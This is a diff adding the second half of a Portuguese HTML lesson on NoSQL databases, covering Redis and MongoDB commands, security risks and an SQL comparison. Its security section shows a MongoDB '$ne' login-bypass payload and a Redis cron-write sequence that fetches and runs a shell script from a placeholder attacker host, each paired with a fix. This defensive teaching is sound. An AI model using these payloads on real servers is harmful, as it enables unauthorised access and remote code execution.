+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">ZADD ranking 1500 <span class="str">"ana"</span> 2300 <span class="str">"bruno"</span> 1800 <span class="str">"carla"</span></span>
+<span class="ok">(integer) 3</span>
+<span class="prompt">127.0.0.1:6379&gt;</span> <span class="cmd">ZREVRANGE ranking 0 2 WITHSCORES</span>
+<span class="ok">1) "bruno"</span>
+<span class="ok">2) "2300"</span>
+<span class="ok">3) "carla"</span>
+<span class="ok">4) "1800"</span>
+<span class="ok">5) "ana"</span>
+<span class="ok">6) "1500"</span>
+  </div>
+
+  <h3 style="font-size:20px; font-weight:700; margin:48px 0 24px; letter-spacing:-0.5px;">
+    MongoDB — documentos e agregações
+  </h3>
+
+  <div class="code purple-code">
+<span class="comment">// Ligação com o mongo shell</span>
+<span class="prompt">$</span> <span class="cmd">mongosh "mongodb://localhost:27017/loja"</span>
+
+<span class="comment">// Inserir documentos numa coleção</span>
+<span class="prompt">loja&gt;</span> <span class="cmd">db.produtos.insertMany([</span>
+<span class="cmd">  { nome: <span class="str">"Teclado Mecânico"</span>, preco: <span class="num">89.90</span>, stock: <span class="num">42</span>,</span>
+<span class="cmd">    categorias: [<span class="str">"informática"</span>, <span class="str">"periféricos"</span>],</span>
+<span class="cmd">    avaliacoes: [{ utilizador: <span class="str">"ana"</span>, nota: <span class="num">5</span> }] },</span>
+<span class="cmd">  { nome: <span class="str">"Rato Sem Fios"</span>, preco: <span class="num">29.90</span>, stock: <span class="num">150</span>,</span>
+<span class="cmd">    categorias: [<span class="str">"informática"</span>, <span class="str">"periféricos"</span>] },</span>
+<span class="cmd">  { nome: <span class="str">"Monitor 27\""</span>, preco: <span class="num">249.00</span>, stock: <span class="num">8</span>,</span>
+<span class="cmd">    categorias: [<span class="str">"informática"</span>, <span class="str">"monitores"</span>] }</span>
+<span class="cmd">])</span>
+<span class="ok">{ acknowledged: true, insertedIds: {...} }</span>
+
+<span class="comment">// Consulta por campo em array</span>
+<span class="prompt">loja&gt;</span> <span class="cmd">db.produtos.find({ categorias: <span class="str">"periféricos"</span> }, { nome: 1, preco: 1, _id: 0 })</span>
+<span class="ok">{ nome: "Teclado Mecânico", preco: 89.9 }</span>
+<span class="ok">{ nome: "Rato Sem Fios", preco: 29.9 }</span>
+
+<span class="comment">// Atualização parcial de um documento aninhado</span>
+<span class="prompt">loja&gt;</span> <span class="cmd">db.produtos.updateOne(</span>
+<span class="cmd">  { nome: <span class="str">"Teclado Mecânico"</span> },</span>
+<span class="cmd">  { $push: { avaliacoes: { utilizador: <span class="str">"bruno"</span>, nota: <span class="num">4</span> } } }</span>
+<span class="cmd">)</span>
+<span class="ok">{ acknowledged: true, modifiedCount: 1 }</span>
+
+<span class="comment">// Pipeline de agregação: preço médio por categoria</span>
+<span class="prompt">loja&gt;</span> <span class="cmd">db.produtos.aggregate([</span>
+<span class="cmd">  { $unwind: <span class="str">"$categorias"</span> },</span>
+<span class="cmd">  { $group: { _id: <span class="str">"$categorias"</span>, precoMedio: { $avg: <span class="str">"$preco"</span> }, total: { $sum: 1 } } },</span>
+<span class="cmd">  { $sort: { precoMedio: -1 } }</span>
+<span class="cmd">])</span>
+<span class="ok">{ _id: "monitores", precoMedio: 249, total: 1 }</span>
+<span class="ok">{ _id: "periféricos", precoMedio: 59.9, total: 2 }</span>
+  </div>
+
+  <div class="info-box">
+    <span class="icon">📊</span>
+    <div>
+      <h5>Agregações — o paralelo com GROUP BY em SQL</h5>
+      <p>
+        O pipeline de agregação do MongoDB é conceptualmente semelhante ao <code>GROUP BY</code> e <code>HAVING</code> do SQL, mas muito mais expressivo. Cada estágio (<code>$match</code>, <code>$group</code>, <code>$sort</code>, <code>$lookup</code>) transforma os dados, e os estágios encadeiam-se como uma linha de produção.
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- SEGURANÇA -->
+<section id="seguranca" class="container">
+  <div class="section-label">04 — Segurança</div>
+  <h2 class="section-title">Segurança em bases NoSQL</h2>
+  <p class="section-desc">
+    As bases NoSQL introduziram novos vetores de ataque e ressuscitaram alguns antigos. A sua juventude relativa, a diversidade de implementações e a frequência com que são expostas na Internet fazem delas um alvo atrativo. Estes são os riscos que mais frequentemente causam incidentes.
+  </p>
+
+  <div class="steps">
+    <div class="step">
+      <div class="step-num">01</div>
+      <div class="step-body">
+        <h4>Injeção NoSQL</h4>
+        <p>
+          O equivalente à SQL Injection, mas adaptado aos operadores das bases NoSQL. O ataque mais famoso explora o operador <code>$ne</code> do MongoDB: um atacante pode enviar <code>{"password": {"$ne": null}}</code> e contornar autenticação se o servidor construir a consulta sem validar tipos.
+        </p>
+        <div class="code meta-code">
+<span class="comment">// ❌ Vulnerável: entrada do utilizador usada diretamente</span>
+<span class="bad">app.post('/login', (req, res) =&gt; {</span>
+<span class="bad">  db.collection('utilizadores').findOne({</span>
+<span class="bad">    username: req.body.username,</span>
+<span class="bad">    password: req.body.password  // pode ser um objeto!</span>
+<span class="bad">  });</span>
+<span class="bad">});</span>
+
+<span class="comment">// Payload do atacante (application/json):</span>
+<span class="bad">{ "username": "admin", "password": { "$ne": null } }</span>
+<span class="dim">^ o operador $ne faz a consulta devolver qualquer password</span>
+
+<span class="comment">// ✅ Seguro: validar tipo e usar operadores explícitos</span>
+<span class="good">app.post('/login', async (req, res) =&gt; {</span>
+<span class="good">  const { username, password } = req.body;</span>
+<span class="good">  if (typeof username !== 'string' || typeof password !== 'string') {</span>
+<span class="good">    return res.status(400).json({ erro: 'Dados inválidos' });</span>
+<span class="good">  }</span>
+<span class="good">  // comparar hash da password com bcrypt/argon2, nunca em texto simples</span>
+<span class="good">});</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">02</div>
+      <div class="step-body">
+        <h4>Instâncias expostas sem autenticação</h4>
+        <p>
+          Este é provavelmente o problema mais grave e mais frequente. Por omissão, muitas bases NoSQL não exigem autenticação e escutam em todas as interfaces (<code>0.0.0.0</code>). Milhares de instâncias MongoDB, Redis, Elasticsearch e Cassandra já foram encontradas abertas na Internet, com dados roubados ou cifrados por ransomware.
+        </p>
+        <div class="code meta-code">
+<span class="comment"># Verificar se o MongoDB está exposto sem autenticação</span>
+<span class="prompt">$</span> <span class="cmd">mongosh "mongodb://203.0.113.42:27017"</span>
+<span class="warn">connecting to: mongodb://203.0.113.42:27017/</span>
+<span class="ok">test&gt;</span> <span class="dim"># ligação bem-sucedida sem credenciais — instância exposta!</span>
+
+<span class="comment"># Verificar se o Redis aceita ligações externas</span>
+<span class="prompt">$</span> <span class="cmd">redis-cli -h 203.0.113.42 ping</span>
+<span class="ok">PONG</span>
+<span class="dim"># qualquer pessoa na Internet consegue ler e escrever</span>
+
+<span class="comment"># Correção: ligar apenas à interface local no redis.conf</span>
+<span class="good">bind 127.0.0.1 ::1</span>
+<span class="good">protected-mode yes</span>
+<span class="good">requirepass &lt;password-forte&gt;</span>
+
+<span class="comment"># Correção: ativar autenticação no MongoDB</span>
+<span class="good">security:</span>
+<span class="good">  authorization: enabled</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">03</div>
+      <div class="step-body">
+        <h4>Controlo de acesso insuficiente</h4>
+        <p>
+          Mesmo com autenticação, muitas implementações usam uma única conta com privilégios de administrador para tudo. O princípio do menor privilégio aplica-se também aqui: cada aplicação deve ter a sua conta com as permissões mínimas necessárias.
+        </p>
+        <div class="code meta-code">
+<span class="comment">// MongoDB — criar utilizador com permissões restritas</span>
+<span class="prompt">admin&gt;</span> <span class="cmd">use loja</span>
+<span class="prompt">loja&gt;</span> <span class="cmd">db.createUser({</span>
+<span class="cmd">  user: <span class="str">"app_loja"</span>,</span>
+<span class="cmd">  pwd: <span class="str">"&lt;password-forte&gt;"</span>,</span>
+<span class="cmd">  roles: [</span>
+<span class="cmd">    { role: <span class="str">"readWrite"</span>, db: <span class="str">"loja"</span> }  <span class="comment">// só esta base, não admin</span></span>
+<span class="cmd">  ]</span>
+<span class="cmd">})</span>
+
+<span class="comment">// ❌ Errado: app a usar a conta de root para tudo</span>
+<span class="bad">mongodb://root:admin@localhost/loja</span>
+
+<span class="comment">// ✅ Certo: app com conta dedicada e restrita</span>
+<span class="good">mongodb://app_loja:&lt;password&gt;@localhost/loja?authSource=loja</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">04</div>
+      <div class="step-body">
+        <h4>Deserialização insegura e RCE</h4>
+        <p>
+          Algumas bases NoSQL permitem execução de scripts no servidor (por exemplo, JavaScript no MongoDB ou Lua no Redis). Se um atacante conseguir injetar código nesses contextos, pode obter execução remota de comandos — o pior cenário possível.
+        </p>
+        <div class="code meta-code">
+<span class="comment"># Redis — se a configuração permitir escrita de ficheiros</span>
+<span class="prompt">$</span> <span class="cmd">redis-cli -h 203.0.113.42 config set dir /var/spool/cron</span>
+<span class="prompt">$</span> <span class="cmd">redis-cli -h 203.0.113.42 config set dbfilename root</span>
+<span class="prompt">$</span> <span class="cmd">redis-cli -h 203.0.113.42 set x <span class="str">"\n\n*/1 * * * * /bin/bash -c 'curl atacante.pt/shell.sh|bash'\n\n"</span></span>
+<span class="prompt">$</span> <span class="cmd">redis-cli -h 203.0.113.42 save</span>
+<span class="err">^ escrita em /var/spool/cron/root — execução remota de comandos</span>
+
+<span class="comment"># Correção no redis.conf</span>
+<span class="good">rename-command CONFIG ""</span>
+<span class="good">rename-command FLUSHALL ""</span>
+<span class="good">rename-command EVAL ""</span>
+<span class="good">user default off</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="danger-box">
+    <span class="icon">🚨</span>
+    <div>
+      <h5>A regra de ouro da exposição</h5>
+      <p>
+        Uma base de dados NoSQL nunca deve estar diretamente acessível da Internet. Deve estar em rede privada, atrás de uma firewall, com autenticação obrigatória e cifra em trânsito (TLS). Se um serviço precisa de acesso externo, deve ser exposto via API controlada, nunca diretamente.
+      </p>
+    </div>
+  </div>
+
+  <div class="table-wrap" style="margin-top:32px;">
+    <table>
+      <thead>
+        <tr>
+          <th>Risco</th>
+          <th>Exemplo</th>
+          <th>Mitigação</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="err">Injeção NoSQL</td>
+          <td class="mono">{ "$ne": null }</td>
+          <td>Validar tipos e usar operadores explícitos</td>
+        </tr>
+        <tr>
+          <td class="err">Exposição na Internet</td>
+          <td class="mono">bind 0.0.0.0</td>
+          <td>Ligar só à local, firewall, VPN</td>
+        </tr>
+        <tr>
+          <td class="warn">Autenticação fraca</td>
+          <td class="mono">sem password</td>
+          <td>Obrigar autenticação, MFA em contas admin</td>
+        </tr>
+        <tr>
+          <td class="warn">Privilégios excessivos</td>
+          <td class="mono">root para tudo</td>
+          <td>Menor privilégio, contas dedicadas por app</td>
+        </tr>
+        <tr>
+          <td class="err">Deserialização insegura</td>
+          <td class="mono">eval, scripts server-side</td>
+          <td>Desativar quando possível</td>
+        </tr>
+        <tr>
+          <td class="warn">Sem cifra em trânsito</td>
+          <td class="mono">sem TLS</td>
+          <td>TLS obrigatório, certificados validados</td>
+        </tr>
+        <tr>
+          <td class="warn">Sem cifra em repouso</td>
+          <td class="mono">dados em claro no disco</td>
+          <td>Encryption at rest, gestão de chaves</td>
+        </tr>
+        <tr>
+          <td class="warn">Backups desprotegidos</td>
+          <td class="mono">dumps acessíveis</td>
+          <td>Cifra dos backups, controlo de acesso</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- COMPARAÇÃO -->
+<section id="comparacao" class="container">
+  <div class="section-label">05 — Comparação</div>
+  <h2 class="section-title">NoSQL vs SQL</h2>
+  <p class="section-desc">
+    A escolha entre SQL e NoSQL não é uma questão de "melhor" ou "pior". É uma questão de adequação ao caso de uso. Em arquiteturas modernas, é comum coexistirem — cada uma a fazer aquilo em que é melhor.
+  </p>
+
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>Critério</th>
+          <th>SQL (relacional)</th>
+          <th>NoSQL</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="mono">Modelo</td>
+          <td class="kali">Tabelas, linhas, colunas</td>
+          <td class="meta">Varia conforme o tipo</td>
+        </tr>
+        <tr>
+          <td class="mono">Esquema</td>
+          <td class="kali">Fixo, definido à priori</td>
+          <td class="meta">Flexível ou inexistente</td>
+        </tr>
+        <tr>
+          <td class="mono">Escala</td>
+          <td class="kali">Vertical (hardware maior)</td>
+          <td class="meta">Horizontal (mais nós)</td>
+        </tr>
+        <tr>
+          <td class="mono">Consistência</td>
+          <td class="ok">ACID forte</td>
+          <td class="warn">BASE / eventual</td>
+        </tr>
+        <tr>
+          <td class="mono">Linguagem</td>
+          <td class="kali">SQL padronizado</td>
+          <td class="meta">Específica de cada base</td>
+        </tr>
+        <tr>
+          <td class="mono">Relações</td>
+          <td class="ok">JOINs nativos</td>
+          <td class="warn">Embutidas ou manuais</td>
+        </tr>
+        <tr>
+          <td class="mono">Transações</td>
+          <td class="ok">Distribuídas e maduras</td>
+          <td class="warn">Variável, por vezes limitadas</td>
+        </tr>
+        <tr>
+          <td class="mono">Maturação</td>
+          <td class="ok">Décadas de uso</td>
+          <td class="warn">Recente, em evolução</td>
+        </tr>
+        <tr>
+          <td class="mono">Casos típicos</td>
+          <td class="kali">Banca, ERP, CRM</td>
+          <td class="meta">Big data, tempo real, IoT</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3 style="font-size:20px; font-weight:700; margin:48px 0 24px; letter-spacing:-0.5px;">
+    Poliglot persistence — o melhor dos dois mundos
+  </h3>
+
+  <p style="color:var(--text-dim); font-size:15px; max-width:820px; margin-bottom:32px;">
+    Em arquiteturas modernas, é comum usar várias bases de dados em simultâneo, cada uma para o que faz melhor. Esta abordagem chama-se <strong>poliglot persistence</strong>. A chave está em escolher a ferramenta certa para cada problema, e não forçar tudo num único modelo.
+  </p>
+
+  <div class="flow">
+    <div class="flow-node kali">PostgreSQL<br><span class="dim">transações financeiras</span></div>
+    <div class="flow-arrow">+</div>
+    <div class="flow-node purple">Redis<br><span class="dim">cache e sessões</span></div>
+    <div class="flow-arrow">+</div>
+    <div class="flow-node meta">MongoDB<br><span class="dim">catálogo de produtos</span></div>
+    <div class="flow-arrow">+</div>
+    <div class="flow-node kali">Elasticsearch<br><span class="dim">pesquisa de texto</span></div>
+  </div>
+
+  <div class="scenario kali">
+    <h5>🛒 Plataforma de e-commerce</h5>
+    <p>
+      PostgreSQL para encomendas e pagamentos (ACID essencial). MongoDB para catálogo de produtos com atributos variáveis por categoria. Redis para cache de sessões e carrinhos. Elasticsearch para pesquisa full-text. Neo4j para recomendações "quem comprou isto também comprou". Cada base faz uma coisa bem.
+    </p>
+  </div>
+
+  <div class="scenario purple">
+    <h5>📊 Plataforma de análise de dados em tempo real</h5>
+    <p>
+      Kafka para ingestão de eventos. Cassandra para armazenamento massivo de séries temporais (escrita intensiva). ClickHouse para análises OLAP. Redis para dashboards em tempo real. O SQL tradicional raramente acompanha estes volumes.
+    </p>
+  </div>
+
+  <div class="scenario meta">
+    <h5>🏥 Sistema de saúde com dados sensíveis</h5>
+    <p>
+      PostgreSQL para registos clínicos (transações ACID obrigatórias). MongoDB para documentos de exames com estruturas variáveis. Redis apenas para cache de curta duração, cifrada. Cifra em repouso em todas as bases. Acesso auditado e restrito. RGPD exige consistência forte para dados pessoais.
+    </p>
+  </div>
+
+  <div class="info-box">
+    <span class="icon">🎯</span>
+    <div>
+      <h5>Como escolher?</h5>
+      <p>
+        Pergunte: (1) os meus dados têm estrutura estável ou evoluem? (2) Preciso de transações ACID fortes? (3) Qual é o volume e o padrão de acesso? (4) A equipa tem experiência com qual modelo? (5) Que ferramentas de monitorização e backup estão disponíveis? A resposta honesta a estas perguntas evita a armadilha comum de escolher a tecnologia da moda em vez da tecnologia adequada.
+      </p>
+    </div>
+  </div>
+
+  <div class="term">
+    <div class="term-bar">
+      <span class="b r"></span>
+      <span class="b y"></span>
+      <span class="b g"></span>
+      <span class="title">verificação rápida — NoSQL em segurança</span>
+    </div>
+    <div class="term-body">
+<span class="prompt">$</span> <span class="cmd"># Verificar se o MongoDB exige autenticação</span>
+<span class="prompt">$</span> <span class="cmd">mongosh --quiet --eval "db.adminCommand({listDatabases: 1})" mongodb://localhost:27017</span>
+<span class="ok">{ databases: [ { name: 'admin', sizeOnDisk: 40960, empty: false }, ... ], totalSize: 123456 }</span>
+<span class="dim">^ se devolver dados sem pedir credenciais, a autenticação não está ativa</span>
+
+<span class="prompt">$</span> <span class="cmd"># Verificar se o Redis está protegido</span>
+<span class="prompt">$</span> <span class="cmd">redis-cli -h 127.0.0.1 CONFIG GET requirepass</span>
+<span class="ok">1) "requirepass"</span>
+<span class="ok">2) ""</span>
+<span class="err">^ password vazia — Redis sem autenticação</span>
+
+<span class="prompt">$</span> <span class="cmd"># Verificar ligações ativas ao MongoDB</span>
+<span class="prompt">$</span> <span class="cmd">sudo ss -tnp | grep 27017</span>
+<span class="info">ESTAB  0  0  127.0.0.1:27017  127.0.0.1:54321  users:(("mongod",pid=1234,fd=42))</span>
+<span class="dim">^ apenas ligações locais — bom</span>
+
+<span class="prompt">$</span> <span class="cmd"># Procurar instâncias MongoDB expostas (Shodan-like, uso ético)</span>
+<span class="prompt">$</span> <span class="cmd">nmap -p 27017 --open 192.168.1.0/24</span>
+<span class="warn">Nmap scan report for 192.168.1.10</span>
+<span class="warn">PORT      STATE SERVICE</span>
+<span class="warn">27017/tcp open  mongod</span>
+<span class="dim">^ atenção: verificar se esta porta deve estar acessível na LAN</span>
+    </div>
+  </div>
+
+  <div class="info-box" style="margin-top:32px;">
+    <span class="icon">📘</span>
+    <div>
+      <h5>Para saber mais</h5>
+      <p>
+        A documentação oficial do <strong>MongoDB</strong> (mongodb.com/docs), <strong>Redis</strong> (redis.io/docs) e <strong>Cassandra</strong> (cassandra.apache.org) é extensa e de qualidade. Para segurança, o <strong>OWASP NoSQL Injection Cheat Sheet</strong> é uma referência essencial. O livro <em>"NoSQL Distilled"</em> de Pramod Sadalage e Martin Fowler continua a ser uma excelente introdução conceptual, e o <strong>site db-engines.com</strong> tem comparações úteis entre dezenas de bases de dados.
+      </p>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <p>NoSQL — Aula interativa · Bases de dados não relacionais</p>
+    <p style="margin-top:8px; font-size:12px;">Documento apenas para fins educativos</p>
+  </div>
+</footer>
+
+<script>
+  document.querySelectorAll('a[href^="#"]').forEach(a => {
+    a.addEventListener('click', e => {
+      const el = document.querySelector(a.getAttribute('href'));
+      if (el) { e.preventDefault(); el.scrollIntoView({ behavior:'smooth', block:'start' }); }
+    });
+  });
+</script>
+
+</body>
+</html>
